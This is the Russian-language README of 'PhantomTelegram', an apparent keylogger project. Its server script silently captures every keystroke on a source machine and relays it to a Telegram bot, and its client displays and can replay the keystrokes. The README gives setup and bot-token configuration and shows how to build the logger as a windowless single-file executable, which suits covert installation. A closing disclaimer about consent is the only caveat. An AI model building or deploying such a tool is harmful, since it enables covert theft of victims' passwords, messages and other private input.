# PhantomTelegram

Два скрипта в папке `logger/` делают всё, что нужно:

- `logger/server.py` — тихо читает нажатия клавиш на исходной машине и шлёт каждое событие в Telegram-бота.
- `logger/client.py` — подключается к тому же боту, показывает входящие нажатия и, по желанию, нажимает те же клавиши на локальной машине.

## Установка
1. **Клонировать репозиторий и зайти в него**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **(Опционально) создать виртуальное окружение**
   ```bash
   python -m venv .venv
   # Windows
   .venv\\Scripts\\activate
   # Linux/macOS
   source .venv/bin/activate
   ```
3. **Поставить зависимости**
   ```bash
   pip install -r requirements.txt
   ```

## Настройка и запуск сервера (машина-источник)
1. Создайте Telegram-бота через @BotFather и получите **токен**.
2. Узнайте свой **Telegram user ID** (например, через @userinfobot).
3. Создайте файл `.env` в корне и добавьте настройки:
   ```env
   LOGGER_BOT_TOKEN=ТОКЕН_БОТА_СЕРВЕРА
   LOGGER_TARGET_USER_ID=ВАШ_USER_ID
   ```
4. Запустите сервер: `python logger/server.py`
5. В Telegram напишите вашему боту `/start`. Бот будет присылать каждое нажатие (символ в сообщении = символ нажатия). Командой `/stop` можно остановить скрипт.

## Настройка и запуск клиента (машина-приёмник)
1. Получите **API ID** и **API hash** на https://my.telegram.org.
2. В том же `.env` пропишите параметры клиента:
   ```env
   LOGGER_API_ID=123456             # ваш api_id (int)
   LOGGER_API_HASH=...              # ваш api_hash (str)
   LOGGER_SESSION_PATH=client_session       # путь/имя файла сессии Telethon
   LOGGER_SERVER_BOT_USERNAME=myserverbot   # юзернейм сервер-бота без @
   ```
   Если `LOGGER_SESSION_PATH` не существует, клиент спросит номер телефона, код из Telegram и (при необходимости) пароль 2FA через всплывающие окна и запишет файл сессии по указанному пути.
3. Запустите клиента: `python logger/client.py`
4. В окне клиента убедитесь, что подставился юзернейм бота, и нажмите **Подключиться**. Последние нажатия будут отображаться в окне; галочка **Копировать ввод** (по умолчанию отключена) включает/выключает воспроизведение нажатий локально.

### Сборка .exe
1. Установите PyInstaller (`pip install pyinstaller`).
2. Для сервера:
   ```bash
   pyinstaller --onefile --noconsole logger/server.py
   ```
3. Для клиента (Tk-интерфейс):
   ```bash
   pyinstaller --onefile --noconsole --add-data "logger/client_session*:." logger/client.py
   ```
   Поместите `.env` рядом с собранным .exe или пропишите значения в среде; файл сессии Telethon будет создан по `LOGGER_SESSION_PATH` при первом входе.

## Зависимости
`requirements.txt` включает только нужное для работы двух скриптов: `pynput`, `pyTelegramBotAPI`, `telethon`, `python-dotenv`.

---
**Внимание.** Используйте инструменты только с явного согласия владельца устройства и в рамках закона. Автор не несёт ответственности за неправомерное применение.
